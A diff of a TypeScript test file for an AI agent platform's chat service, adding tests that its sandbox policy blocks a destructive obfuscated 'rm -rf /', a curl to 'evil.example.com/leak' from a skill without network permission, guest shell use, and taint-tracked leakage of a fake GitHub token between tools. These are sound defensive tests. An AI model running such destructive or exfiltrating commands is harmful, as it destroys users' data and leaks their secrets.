@@ -11,6 +11,7 @@ import {
 } from '@langchain/core/messages';
 import { Test, TestingModule } from '@nestjs/testing';
 import type { InstalledSkill } from '@prisma/client';
+import type { SkillPermission } from '@skillwharf/shared';
 import { BillingService } from '../billing/billing.service.js';
 import { ERROR_KEYS } from '../i18n/error-keys.js';
 import {
@@ -40,10 +41,7 @@ import { LlmRouterService } from '../llm-router/llm-router.service.js';
 import { MemoryService } from '../memory/memory.service.js';
 import { PrismaService } from '../prisma/prisma.service.js';
 import { AgentGatewayService } from '../security/agent-gateway.service.js';
-import {
-  SANDBOX_NETWORK_FLAG,
-  type SandboxService,
-} from '../sandbox/sandbox.service.js';
+import type { SandboxService } from '../sandbox/sandbox.service.js';
 import { SkillsService } from '../skills/skills.service.js';
 import { ChatService } from './chat.service.js';
 import type { OfficeEvent } from './office-events.js';
@@ -52,11 +50,15 @@ const CONVERSATION_ID = '11111111-1111-1111-1111-111111111111';
 const USER_ID = '22222222-2222-2222-2222-222222222222';
 const OTHER_USER_ID = '33333333-3333-3333-3333-333333333333';
 
+/** Секрет (GitHub PAT-формат), который извлекает taint-анализатор. */
+const LEAKED_TOKEN = `ghp_${'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'.slice(0, 36)}`;
+
 type MockFn = ReturnType<typeof vi.fn>;
 
 interface PrismaMock {
   conversation: { findUnique: MockFn; update: MockFn; create: MockFn };
   message: { create: MockFn; findMany: MockFn };
+  user: { findUnique: MockFn };
 }
 
 interface SandboxMock {
@@ -115,12 +117,41 @@ function streamOf(message: AIMessage): AsyncGenerator<ChatStreamChunk> {
   })();
 }
 
+/** Разрешения и egress, которые обычно объявляет навык для инструмента. */
+interface SkillOptions {
+  permissions?: readonly SkillPermission[];
+  egressAllowlist?: readonly string[];
+  mcpEndpoint?: string;
+}
+
+/** Разрешения, которые тестовый навык объявляет по умолчанию для инструмента. */
+const DEFAULT_PERMISSIONS: Readonly<Record<string, readonly SkillPermission[]>> =
+  {
+    [SANDBOX_TOOL_NAME]: ['shell'],
+    [EXEC_TOOL_NAME]: ['shell', 'network'],
+    [WEB_SEARCH_TOOL_NAME]: ['network'],
+    [OZON_MCP_TOOL_NAME]: ['network'],
+    [WB_MCP_TOOL_NAME]: ['network'],
+  };
+
+/** Egress, который тестовый навык объявляет по умолчанию (network-инструменты). */
+const DEFAULT_EGRESS: Readonly<Record<string, readonly string[]>> = {
+  [EXEC_TOOL_NAME]: ['api.github.com', 'github.com'],
+  [WEB_SEARCH_TOOL_NAME]: ['api.tavily.com'],
+  [OZON_MCP_TOOL_NAME]: ['api.ozon.ru'],
+  [WB_MCP_TOOL_NAME]: ['api.wildberries.ru'],
+};
+
 function createSkill(
   name: string,
   tool: string,
   pricing?: TestPricing,
   requiresApproval = false,
+  options: SkillOptions = {},
 ): InstalledSkill {
+  const permissions = options.permissions ?? DEFAULT_PERMISSIONS[tool] ?? [];
+  const egress = options.egressAllowlist ?? DEFAULT_EGRESS[tool];
+
   return {
     id: `skill-${name}`,
     name,
@@ -132,13 +163,15 @@ function createSkill(
       description: `Тестовый навык ${name}`,
       author: { name: 'SkillWharf Team' },
       dependencies: { tools: [tool] },
-      permissions: [],
+      permissions: [...permissions],
+      ...(egress ? { egress_allowlist: [...egress] } : {}),
+      ...(options.mcpEndpoint ? { mcp_endpoint: options.mcpEndpoint } : {}),
       ...(pricing ? { pricing } : {}),
       ...(requiresApproval ? { requiresApproval: true } : {}),
     },
     isEnabled: true,
     installedAt: new Date(),
-  } as InstalledSkill;
+  } as unknown as InstalledSkill;
 }
 
 describe('ChatService', () => {
@@ -160,6 +193,7 @@ describe('ChatService', () => {
         create: vi.fn(),
       },
       message: { create: vi.fn(), findMany: vi.fn() },
+      user: { findUnique: vi.fn().mockResolvedValue({ role: 'user' }) },
     };
     sandbox = { runCommand: vi.fn() };
     billing = {
@@ -587,10 +621,186 @@ describe('ChatService', () => {
 
       await expect(
         service.handleMessage(USER_ID, CONVERSATION_ID, 'удали всё'),
-      ).rejects.toBeInstanceOf(ForbiddenException);
+      ).rejects.toMatchObject({
+        status: 403,
+        response: { code: 'errors.policy_blocked' },
+      });
 
       expect(sandbox.runCommand).not.toHaveBeenCalled();
       expect(billing.authorizeHold).not.toHaveBeenCalled();
+    });
+
+    it('блокирует обфускацию rm -rf, которую пропускал старый regex', async () => {
+      skills.getEnabledSkills.mockResolvedValue([
+        createSkill('code-runner', SANDBOX_TOOL_NAME),
+      ]);
+      prisma.message.findMany.mockResolvedValue([
+        { role: 'user', content: 'удали всё' },
+      ]);
+      chatWithToolsStream.mockReturnValueOnce(
+        streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: "r''m -rf /" })),
+      );
+
+      await expect(
+        service.handleMessage(USER_ID, CONVERSATION_ID, 'удали всё'),
+      ).rejects.toMatchObject({
+        status: 403,
+        response: { code: 'errors.policy_blocked' },
+      });
+
+      expect(sandbox.runCommand).not.toHaveBeenCalled();
+    });
+
+    it('разрешает сеть в песочнице только с network-разрешением навыка и передаёт allowlist', async () => {
+      skills.getEnabledSkills.mockResolvedValue([
+        createSkill('network-skill', SANDBOX_TOOL_NAME, undefined, false, {
+          permissions: ['network', 'shell'],
+          egressAllowlist: ['api.tavily.com'],
+        }),
+      ]);
+      prisma.message.findMany.mockResolvedValue([
+        { role: 'user', content: 'сходи в API' },
+      ]);
+      chatWithToolsStream
+        .mockReturnValueOnce(
+          streamOf(
+            toolCallMessage(SANDBOX_TOOL_NAME, {
+              code: 'curl https://api.tavily.com/search',
+            }),
+          ),
+        )
+        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
+      sandbox.runCommand.mockResolvedValue('{}');
+
+      await expect(
+        service.handleMessage(USER_ID, CONVERSATION_ID, 'сходи в API'),
+      ).resolves.toMatchObject({ reply: 'Готово' });
+
+      expect(sandbox.runCommand.mock.calls[0]?.[2]).toEqual({
+        egress: { allowlist: ['api.tavily.com'] },
+      });
+    });
+
+    it('запрещает сетевой код без network-разрешения навыка', async () => {
+      skills.getEnabledSkills.mockResolvedValue([
+        createSkill('code-runner', SANDBOX_TOOL_NAME),
+      ]);
+      prisma.message.findMany.mockResolvedValue([
+        { role: 'user', content: 'сходи в интернет' },
+      ]);
+      chatWithToolsStream.mockReturnValueOnce(
+        streamOf(
+          toolCallMessage(SANDBOX_TOOL_NAME, {
+            code: 'curl https://evil.example.com/leak',
+          }),
+        ),
+      );
+
+      await expect(
+        service.handleMessage(USER_ID, CONVERSATION_ID, 'сходи в интернет'),
+      ).rejects.toMatchObject({
+        status: 403,
+        response: { code: 'errors.policy_blocked' },
+      });
+
+      expect(sandbox.runCommand).not.toHaveBeenCalled();
+    });
+
+    it('не запускает shell-инструменты от имени гостя', async () => {
+      prisma.user.findUnique.mockResolvedValue({ role: 'guest' });
+      prisma.message.findMany.mockResolvedValue([
+        { role: 'user', content: 'запусти echo' },
+      ]);
+      chatWithToolsStream.mockReturnValueOnce(
+        streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
+      );
+
+      await expect(
+        service.handleMessage(USER_ID, CONVERSATION_ID, 'запусти echo'),
+      ).rejects.toMatchObject({
+        status: 403,
+        response: { code: 'errors.policy_blocked' },
+      });
+
+      expect(sandbox.runCommand).not.toHaveBeenCalled();
+    });
+
+    it('маскирует секрет из web_search в следующем поисковом запросе (taint)', async () => {
+      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
+      skills.getEnabledSkills.mockResolvedValue([
+        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME),
+      ]);
+      prisma.message.findMany.mockResolvedValue([
+        { role: 'user', content: 'найди токен' },
+      ]);
+      chatWithToolsStream
+        .mockReturnValueOnce(
+          streamOf(
+            toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'токены github' }),
+          ),
+        )
+        .mockReturnValueOnce(
+          streamOf(
+            toolCallMessage(WEB_SEARCH_TOOL_NAME, {
+              query: `повтори ${LEAKED_TOKEN}`,
+            }),
+          ),
+        )
+        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
+      sandbox.runCommand
+        .mockResolvedValueOnce(`{"results":[{"snippet":"${LEAKED_TOKEN}"}]}`)
+        .mockResolvedValueOnce('{"results":[]}');
+
+      await expect(
+        service.handleMessage(USER_ID, CONVERSATION_ID, 'найди токен'),
+      ).resolves.toMatchObject({ reply: 'Готово' });
+
+      const secondEnv = sandbox.runCommand.mock.calls[1]?.[1] as
+        | Record<string, string>
+        | undefined;
+      const requestBody = JSON.parse(
+        secondEnv?.TAVILY_REQUEST_BODY ?? '{}',
+      ) as { query?: string };
+
+      expect(requestBody.query).toContain('[REDACTED]');
+      expect(requestBody.query).not.toContain(LEAKED_TOKEN);
+    });
+
+    it('блокирует утечку секрета из web_search в exec (taint)', async () => {
+      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
+      skills.getEnabledSkills.mockResolvedValue([
+        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME),
+        createSkill('github', EXEC_TOOL_NAME),
+      ]);
+      prisma.message.findMany.mockResolvedValue([
+        { role: 'user', content: 'найди токен и выполни' },
+      ]);
+      chatWithToolsStream
+        .mockReturnValueOnce(
+          streamOf(
+            toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'токены github' }),
+          ),
+        )
+        .mockReturnValueOnce(
+          streamOf(
+            toolCallMessage(EXEC_TOOL_NAME, {
+              command: `echo ${LEAKED_TOKEN}`,
+            }),
+          ),
+        );
+      sandbox.runCommand
+        .mockResolvedValueOnce(`{"results":[{"snippet":"${LEAKED_TOKEN}"}]}`)
+        .mockResolvedValueOnce('ok');
+
+      await expect(
+        service.handleMessage(USER_ID, CONVERSATION_ID, 'найди токен и выполни'),
+      ).rejects.toMatchObject({
+        status: 403,
+        response: { code: 'errors.policy_blocked' },
+      });
+
+      // Успел выполниться только безопасный web_search.
+      expect(sandbox.runCommand).toHaveBeenCalledTimes(1);
     });
 
     it('не запускает агента при балансе ниже минимального', async () => {
@@ -661,13 +871,16 @@ describe('ChatService', () => {
         0,
       );
 
-      const [command, env] = sandbox.runCommand.mock.calls[0] as [
+      const [command, env, runOptions] = sandbox.runCommand.mock.calls[0] as [
         string,
         Record<string, string>,
+        { egress?: { allowlist: readonly string[] } },
       ];
 
       expect(command).toContain('https://api.tavily.com/search');
-      expect(env[SANDBOX_NETWORK_FLAG]).toBe('true');
+      // Сеть включается только egress-allowlist из манифеста навыка.
+      expect(runOptions).toEqual({ egress: { allowlist: ['api.tavily.com'] } });
+      expect(env).toEqual({ TAVILY_REQUEST_BODY: expect.any(String) });
 
       // Сначала деньги, потом запуск инструмента.
       expect(
@@ -720,7 +933,8 @@ describe('ChatService', () => {
       );
       expect(sandbox.runCommand).toHaveBeenCalledWith(
         'gh --version',
-        expect.objectContaining({ [SANDBOX_NETWORK_FLAG]: 'true' }),
+        {},
+        { egress: { allowlist: ['api.github.com', 'github.com'] } },
       );
     });
 
@@ -766,7 +980,9 @@ describe('ChatService', () => {
 
       expect(result.reply).toBe('Готово: hi');
       expect(billing.checkAndChargeSkill).not.toHaveBeenCalled();
-      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {});
+      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {}, {
+        egress: undefined,
+      });
     });
 
     it('прерывает выполнение при нехватке средств', async () => {
@@ -962,7 +1178,9 @@ describe('ChatService', () => {
       const result = await streamPromise;
 
       expect(result.reply).toBe('Готово: hi');
-      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {});
+      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {}, {
+        egress: undefined,
+      });
     });
 
     it('помечает waiting_approval для Pay-per-Outcome как payment', async () => {
